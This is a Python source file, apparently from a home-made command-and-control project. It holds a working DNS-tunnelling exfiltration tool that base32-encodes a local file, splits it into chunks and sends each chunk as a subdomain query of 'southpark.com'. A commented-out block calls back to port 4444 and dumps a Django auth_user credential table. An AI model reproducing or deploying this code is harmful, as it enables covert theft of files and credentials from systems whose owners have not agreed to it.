'''import socket
import datetime

host = '192.168.1.37'
port = 4444

clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientsocket.connect((host, port))

resp = ("Windows ->"+str(datetime.datetime.now()))
clientsocket.send(resp.encode('ascii'))

clientsocket.close()

import sqlite3

conn = sqlite3.connect("..\C2_Django\db.sqlite3")
cursor = conn.cursor()

print(cursor.execute("SELECT * from auth_user;").fetchall())
'''
import dnslib
import socket
import base64
import time
import select

dns_server = '127.0.0.1'
domain_name = 'southpark.com'

def dns_udp_handle(data):
        query = dnslib.DNSRecord.question(f"{data}.{domain_name}")
        dns_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dns_socket.setblocking(0)
        
        while True:
            dns_socket.sendto(query.pack(), (dns_server, 53))
            state = select.select([dns_socket], [], [], 1)
            if state[0]:
                response = dnslib.DNSRecord.parse(dns_socket.recv(4096))
                break                

                     
def send_over_dns(data, file_name):
    domain_name = "southpark.com"
    resp = []
    resp.append(base64.b32encode(b'#FILE# ' + file_name.encode()))
    for i in range(0, len(data), 32):
        if i+32 > len(data) - 1:
            resp.append(data[i:len(data)])
            break
        resp.append(data[i:i+32])
    resp.append(base64.b32encode(b"#END#"))
    for chunk in resp:
        ch = str(chunk).strip("'b")
        print(ch, end="\n")
        time.sleep(1)
        dns_udp_handle(ch)

if __name__ == "__main__":

    encoded_data = None
    file_name = 'image.png'
    with open(file_name, 'rb') as obj:
        data = obj.read()
        encoded_data = base64.b32encode(data)
        encoded_data = str(encoded_data).strip("'b")
    send_over_dns(encoded_data, file_name)